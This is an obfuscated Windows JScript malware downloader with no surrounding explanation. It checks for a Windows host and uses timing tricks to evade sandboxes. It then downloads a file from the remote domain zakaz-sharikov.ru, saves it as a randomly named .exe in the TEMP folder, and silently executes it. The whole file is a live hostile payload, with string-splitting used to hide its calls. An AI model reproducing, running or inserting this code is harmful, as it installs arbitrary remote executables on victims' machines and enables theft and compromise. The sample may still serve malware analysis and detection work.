var EH = false;
var U = "Create"+"Object";
var AG = function B() {return WScript[U]("WScript"+".Shell");}(), ML = 11;
var X = "MSXML2"+".XMLHTTP";
var E = 2;
var L0 = E - 2;
function N(IR){AG["Run"](IR, L0, L0);};
function SX(){return X + "";};
function DY(UO, S0){L0 = L0 * 1; return UO - S0;};
function KS(){return U;};
/*@cc_on
  @if (@_win32 || @_win64)
    EH = true;
  @end
@*/
if (EH)
{
var L = "";
function Z(){return 22;};
var R = 0; var N0 = 0;
function K()
{
var AN = new this["Date"]();
var S = AN["getUTCMilliseconds"]();
WScript["Sleep"](Z());
var AN = new this["Date"]();
var U0 = AN["getUTCMilliseconds"]();
WScript["Sleep"](Z());
var AN = new this["Date"]();
var ZY = AN["getUTCMilliseconds"]();
var R = "NY";
R = DY(U0, S);
var N0 = "ID";
N0 = DY(ZY, U0);
L = "open";
return DY(R, N0);
}
var WK = false;
var DF = false;
for (var G0 = L0; G0 < Z() * 1; G0++){if (K() != L0){
WK = true; 
N0 = "31" + 11 * R + N0; 
DF = true; 
break;
}}
function W() {return ((WK == true) && (WK == DF)) ? 1 : L0;};
if (WK && W() && DF){
function IT() {return AG["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "4ZCMn4C6uR5XJgK.ex" + "e";};
 RT = SX();
 ZQ = WScript[U](RT);
 var ZK = 1;
do { 
	for (;ZK;){
	try {
		if (ZK == 1)
		{
			ZQ[L]("GET", "http://zakaz-sharikov.ru/x9dslp", false);
			ZQ["send"]();
			C = "Sleep";
			ZK = 2;
		}
		WScript[C](Z() + 120); 
		if (ZQ["readystate"] < 2 * 2) continue;
		ZK = L0;
		function G(MF) {var YN = (1, 2, 3, 4, 5, MF); return YN;};
		C0 = WScript[KS()]("ADODB.Stream");
		RT = C0;
		RT[L]();
		RT["type"] = G(1);
		RT["write"](ZQ["ResponseBody"]);
		C0["position"] = G(L0);
		RT["Save" + "ToFile"](IT(), 2);
		C0["cl"+"ose"]();
		I = IT();
		N(I);
	} catch(N1){};};
}while (ZK);
}
}

